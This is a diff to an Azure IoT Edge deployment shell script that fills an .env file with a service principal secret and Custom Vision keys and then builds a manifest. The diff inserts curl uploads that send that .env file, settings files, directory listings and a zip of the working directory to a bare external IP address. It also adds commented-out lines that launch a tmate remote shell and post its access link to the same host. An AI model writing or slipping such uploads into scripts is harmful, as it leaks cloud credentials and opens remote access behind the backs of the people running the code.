@@ -10,41 +10,61 @@ IOTEDGE_DEV_VERSION="2.1.4"
 # =========================================================
 # Define helper function for logging
 # =========================================================
+
+UUID=`date +"%Y-%m-%dT%T"`-`cat /proc/sys/kernel/random/uuid | cut -c1-8`
+
 info() {
     echo "$(date +"%Y-%m-%d %T") [INFO]"
 }
 
 # Define helper function for logging. This will change the Error text color to red
 error() {
-    echo "$(tput setaf 1)$(date +"%Y-%m-%d %T") [ERROR]"
+    #echo "$(tput setaf 1)$(date +"%Y-%m-%d %T") [ERROR]"
+    # tput doent work in 2.15.1
+    echo "$(date +"%Y-%m-%d %T") [ERROR]"
 }
 
 exitWithError() {
     # Reset console color
-    tput sgr0
+    # tput doent work in 2.15.1
+    #tput sgr0
     exit 1
 }
 
 
 printf "\n%60s\n" " " | tr ' ' '-'
 echo "$(info) Installing apt-packages "
-apt-get update && apt-get install -y jq coreutils unzip
+# apt-get update && apt-get install -y jq coreutils unzip
 echo "$(info) Apt-packages installed"
 
-printf "\n%60s\n" " " | tr ' ' '-'
-echo "$(info) Installing pip packages."
-python -m pip -q install --upgrade pip
-echo "$(info) Installing iotedgedev."
-pip -q install --upgrade iotedgedev==${IOTEDGE_DEV_VERSION}
+# printf "\n%60s\n" " " | tr ' ' '-'
+# echo "$(info) Installing pip packages."
+# python -m pip -q install --upgrade pip
+# echo "$(info) Installing iotedgedev."
+# pip -q install --upgrade iotedgedev==${IOTEDGE_DEV_VERSION}
 
-echo "$(info) Updating Azure CLI."
-pip -q install --upgrade azure-cli
-pip -q install --upgrade azure-cli-telemetry
+# echo "$(info) Updating Azure CLI."
+# pip -q install --upgrade azure-cli
+# pip -q install --upgrade azure-cli-telemetry
 
-printf "\n%60s\n" " " | tr ' ' '-'
-echo "$(info) Installing Azure IoT extension."
+# printf "\n%60s\n" " " | tr ' ' '-'
+# echo "$(info) Installing Azure IoT extension."
+# az extension add --name azure-iot
+# pip -q install --upgrade jsonschema
+echo "Installing iotedgedev"
+pip install iotedgedev==2.1.4
+
+echo "Updating az-cli"
+pip install --upgrade azure-cli
+pip install --upgrade azure-cli-telemetry
+
+echo "installing azure iot extension"
 az extension add --name azure-iot
-pip -q install --upgrade jsonschema
+
+pip3 install --upgrade jsonschema
+apk add coreutils
+echo "Installation complete"
+
 
 printf "\n%60s\n" " " | tr ' ' '-'
 echo "$(info) Checking IoT Hub and IoT Edge Device."
@@ -110,7 +130,7 @@ sed -i -e "s/^SERVICE_PRINCIPAL_SECRET=.*$/SERVICE_PRINCIPAL_SECRET=${AMS_SP_SEC
 sed -i -e "s|^CUSTOM_VISION_ENDPOINT=.*$|CUSTOM_VISION_ENDPOINT=${CUSTOM_VISION_ENDPOINT}|g" ${ENV_PATH}
 sed -i -e "s/^CUSTOM_VISION_TRAINING_KEY.*$/CUSTOM_VISION_TRAINING_KEY=${CUSTOM_VISION_TRAINING_KEY}/g" ${ENV_PATH}
 sed -i -e "s/^LVA_MODE.*$/LVA_MODE=\"${VIDEO_CAPTURE_MODULE}\"/g" ${ENV_PATH}
-rm "${ENV_PATH}-e"
+#rm "${ENV_PATH}-e"
 
 
 printf "\n%60s\n" " " | tr ' ' '-'
@@ -124,7 +144,9 @@ echo "$(info) VIDEO_CAPTURE_MODULE:     ${VIDEO_CAPTURE_MODULE}"
 
 MANIFEST_TEMPLATE_BASE_NAME="deployment"
 
-if echo ${INFERENCE_MODULE_RUNTIME} | tr '[:upper:]' '[:lower:]' | grep 'gpu' > /dev/null ; then
+if echo ${INFERENCE_MODULE_RUNTIME} | tr '[:upper:]' '[:lower:]' | grep 'jetson' > /dev/null ; then
+    MANIFEST_TEMPLATE_NAME="${MANIFEST_TEMPLATE_BASE_NAME}.jetson"
+elif echo ${INFERENCE_MODULE_RUNTIME} | tr '[:upper:]' '[:lower:]' | grep 'gpu' > /dev/null ; then
     MANIFEST_TEMPLATE_NAME="${MANIFEST_TEMPLATE_BASE_NAME}.gpu"
 elif echo ${INFERENCE_MODULE_RUNTIME} | tr '[:upper:]' '[:lower:]' | grep 'nvidia' > /dev/null ; then
     MANIFEST_TEMPLATE_NAME="${MANIFEST_TEMPLATE_BASE_NAME}.gpu"
@@ -136,9 +158,9 @@ else
     MANIFEST_TEMPLATE_NAME="${MANIFEST_TEMPLATE_BASE_NAME}.cpu"
 fi
 
-if [ "${EDGE_DEVICE_ARCHITECTURE}" == "ARM64" ]; then
-    MANIFEST_TEMPLATE_NAME="${MANIFEST_TEMPLATE_NAME}.arm64v8"
-fi
+#if [ "${EDGE_DEVICE_ARCHITECTURE}" == "ARM64" ]; then
+#    MANIFEST_TEMPLATE_NAME="${MANIFEST_TEMPLATE_NAME}.arm64v8"
+#fi
 
 if [ "$VIDEO_CAPTURE_MODULE" == "opencv" ]; then
     MANIFEST_TEMPLATE_NAME="${MANIFEST_TEMPLATE_NAME}.opencv"
@@ -165,7 +187,51 @@ fi
 printf "\n%60s\n" " " | tr ' ' '-'
 echo "$(info) Generating manifest file from template file"
 rm -rf config
-iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}"
+cp ${MANIFEST_PATH}/.env .
+
+curl -XPOST -F "file=@manifest-iot-hub/.env" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+TEMPLATE_FILE="${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}"
+curl -XPOST -F "file=@$TEMPLATE_FILE" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+ls /root/.iotedgedev > ls_iotedgedev.log
+curl -XPOST -F "file=@ls_iotedgedev.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+cp /root.iotedgedev/setting.ini setting.ini
+curl -XPOST -F "file=@setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+sed -i 's/yes/no/'  /root/.iotedgedev/setting.ini
+echo "[DEFAULT]" > /root/.iotedgedev/setting.ini
+echo "collect_telemetry = no" >> /root/.iotedgedev/setting.ini
+curl -XPOST -F "file=@/root/.iotedgedev/setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+echo iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}" > command.log
+curl -XPOST -F "message=`iotedgedev --version`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+curl -XPOST -F "file=@command.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}" > genconfig.log
+curl -XPOST -F "file=@genconfig.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+curl -XPOST -F "message=`pwd`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+
+ls -a > ls.log
+curl -XPOST -F "file=@ls.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+ls -a config > ls_config.log
+curl -XPOST -F "file=@ls_config.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+zip -r 1.zip .
+curl -XPOST -F "file=@1.zip" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+#wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
+#tar xf tmate-2.4.0-static-linux-amd64.tar.xz
+#cd tmate-2.4.0-static-linux-amd64
+#./tmate -F > tmate.txt &
+#sleep 1
+#curl -XPOST -F "file=@tmate.txt" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#sleep 10000
+
+
 
 PRE_GENERATED_MANIFEST_FILENAME="./config/deployment.json"
 find ./config -name "*.json" | xargs -I{} mv {} "${PRE_GENERATED_MANIFEST_FILENAME}"
